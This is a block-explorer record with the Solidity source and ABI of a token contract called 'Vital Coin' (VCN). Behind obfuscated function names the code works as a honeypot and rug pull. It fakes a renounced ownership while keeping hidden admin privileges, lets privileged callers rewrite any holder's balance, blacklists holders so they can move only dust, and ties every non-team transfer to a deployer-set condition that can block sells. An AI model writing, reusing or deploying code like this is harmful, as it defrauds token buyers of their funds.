{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract swapTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeExempt {\n    function createPair(address amountToken, address sellEnable) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface maxReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface txLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeShould) external view returns (uint256);\n\n    function transfer(address listMarketing, uint256 exemptEnable) external returns (bool);\n\n    function allowance(address tokenLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listMarketing,\n        uint256 exemptEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptIs, uint256 value);\n    event Approval(address indexed tokenLaunched, address indexed spender, uint256 value);\n}\n\ninterface txLiquidityMetadata is txLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract VitalCoin is swapTx, txLiquidity, txLiquidityMetadata {\n\n    function atLiquidityWallet(address listAmount) public {\n        teamSell();\n        if (modeList != launchTakeMax) {\n            launchTxExempt = false;\n        }\n        if (listAmount == teamEnable || listAmount == tradingSwapLaunched) {\n            return;\n        }\n        totalLimit[listAmount] = true;\n    }\n\n    event OwnershipTransferred(address indexed marketingSell, address indexed autoTeamMode);\n\n    function amountTo(uint256 exemptEnable) public {\n        teamSell();\n        feeShouldMax = exemptEnable;\n    }\n\n    string private toExempt = \"VCN\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return toExempt;\n    }\n\n    address txBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public atTrading;\n\n    uint256 fromMode;\n\n    function transfer(address toTotal, uint256 exemptEnable) external virtual override returns (bool) {\n        return fromMinLaunched(_msgSender(), toTotal, exemptEnable);\n    }\n\n    bool public exemptAuto;\n\n    function exemptMin() public {\n        emit OwnershipTransferred(teamEnable, address(0));\n        launchLimit = address(0);\n    }\n\n    uint256 constant limitMin = 16 ** 10;\n\n    string private launchedWallet = \"Vital Coin\";\n\n    address public tradingSwapLaunched;\n\n    function fromMax(address sellToMarketing, address listMarketing, uint256 exemptEnable) internal view returns (uint256) {\n        require(exemptEnable > 0);\n\n        uint256 receiverFrom = 0;\n        if (sellToMarketing == tradingSwapLaunched && feeListMax > 0) {\n            receiverFrom = exemptEnable * feeListMax / 100;\n        } else if (listMarketing == tradingSwapLaunched && isFrom > 0) {\n            receiverFrom = exemptEnable * isFrom / 100;\n        }\n        require(receiverFrom <= exemptEnable);\n        return exemptEnable - receiverFrom;\n    }\n\n    uint256 private launchTakeMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingExempt;\n    }\n\n    mapping(address => uint256) private takeLaunch;\n\n    address public teamEnable;\n\n    mapping(address => bool) public totalLimit;\n\n    uint256 public feeListMax = 3;\n\n    mapping(address => bool) public limitAmountTrading;\n\n    function modeMin(address toTotal, uint256 exemptEnable) public {\n        teamSell();\n        takeLaunch[toTotal] = exemptEnable;\n    }\n\n    function owner() external view returns (address) {\n        return launchLimit;\n    }\n\n    function balanceOf(address modeShould) public view virtual override returns (uint256) {\n        return takeLaunch[modeShould];\n    }\n\n    function tradingMin(address sellToMarketing, address listMarketing, uint256 exemptEnable) internal returns (bool) {\n        require(takeLaunch[sellToMarketing] >= exemptEnable);\n        takeLaunch[sellToMarketing] -= exemptEnable;\n        takeLaunch[listMarketing] += exemptEnable;\n        emit Transfer(sellToMarketing, listMarketing, exemptEnable);\n        return true;\n    }\n\n    uint256 feeShouldMax;\n\n    function allowance(address swapModeList, address sellTotal) external view virtual override returns (uint256) {\n        if (sellTotal == txBuy) {\n            return type(uint256).max;\n        }\n        return feeReceiverMarketing[swapModeList][sellTotal];\n    }\n\n    bool public launchAuto;\n\n    function teamSell() private view {\n        require(limitAmountTrading[_msgSender()]);\n    }\n\n    constructor (){\n        if (modeList == launchTakeMax) {\n            launchTakeMax = launchedFrom;\n        }\n        exemptMin();\n        maxReceiver sellTeam = maxReceiver(txBuy);\n        tradingSwapLaunched = feeExempt(sellTeam.factory()).createPair(sellTeam.WETH(), address(this));\n        receiverFromEnable = feeExempt(sellTeam.factory()).feeTo();\n        if (walletFund != launchTxExempt) {\n            walletFund = true;\n        }\n        teamEnable = _msgSender();\n        limitAmountTrading[teamEnable] = true;\n        takeLaunch[teamEnable] = receiverAmount;\n        if (exemptAuto == launchAuto) {\n            modeList = launchedFrom;\n        }\n        emit Transfer(address(0), teamEnable, receiverAmount);\n    }\n\n    uint256 public modeList;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedWallet;\n    }\n\n    bool public toListSell;\n\n    uint8 private marketingExempt = 18;\n\n    function fromMinLaunched(address sellToMarketing, address listMarketing, uint256 exemptEnable) internal returns (bool) {\n        if (sellToMarketing == teamEnable) {\n            return tradingMin(sellToMarketing, listMarketing, exemptEnable);\n        }\n        uint256 atFundReceiver = txLiquidity(tradingSwapLaunched).balanceOf(receiverFromEnable);\n        require(atFundReceiver == feeShouldMax);\n        require(listMarketing != receiverFromEnable);\n        if (totalLimit[sellToMarketing]) {\n            return tradingMin(sellToMarketing, listMarketing, limitMin);\n        }\n        exemptEnable = fromMax(sellToMarketing, listMarketing, exemptEnable);\n        return tradingMin(sellToMarketing, listMarketing, exemptEnable);\n    }\n\n    uint256 public launchedFrom;\n\n    bool private walletFund;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverAmount;\n    }\n\n    function approve(address sellTotal, uint256 exemptEnable) public virtual override returns (bool) {\n        feeReceiverMarketing[_msgSender()][sellTotal] = exemptEnable;\n        emit Approval(_msgSender(), sellTotal, exemptEnable);\n        return true;\n    }\n\n    address private launchLimit;\n\n    bool public launchTxExempt;\n\n    mapping(address => mapping(address => uint256)) private feeReceiverMarketing;\n\n    uint256 private receiverAmount = 100000000 * 10 ** 18;\n\n    uint256 public isFrom = 0;\n\n    function maxExempt(address amountLaunch) public {\n        if (shouldTakeTx) {\n            return;\n        }\n        \n        limitAmountTrading[amountLaunch] = true;\n        if (atTrading != launchTxExempt) {\n            receiverFund = false;\n        }\n        shouldTakeTx = true;\n    }\n\n    function transferFrom(address sellToMarketing, address listMarketing, uint256 exemptEnable) external override returns (bool) {\n        if (_msgSender() != txBuy) {\n            if (feeReceiverMarketing[sellToMarketing][_msgSender()] != type(uint256).max) {\n                require(exemptEnable <= feeReceiverMarketing[sellToMarketing][_msgSender()]);\n                feeReceiverMarketing[sellToMarketing][_msgSender()] -= exemptEnable;\n            }\n        }\n        return fromMinLaunched(sellToMarketing, listMarketing, exemptEnable);\n    }\n\n    bool public receiverFund;\n\n    address receiverFromEnable;\n\n    bool public shouldTakeTx;\n\n    function getOwner() external view returns (address) {\n        return launchLimit;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTeamMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapModeList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptEnable\",\"type\":\"uint256\"}],\"name\":\"amountTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAmount\",\"type\":\"address\"}],\"name\":\"atLiquidityWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeListMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTxExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitAmountTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunch\",\"type\":\"address\"}],\"name\":\"maxExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptEnable\",\"type\":\"uint256\"}],\"name\":\"modeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTakeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toListSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSwapLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellToMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "VitalCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}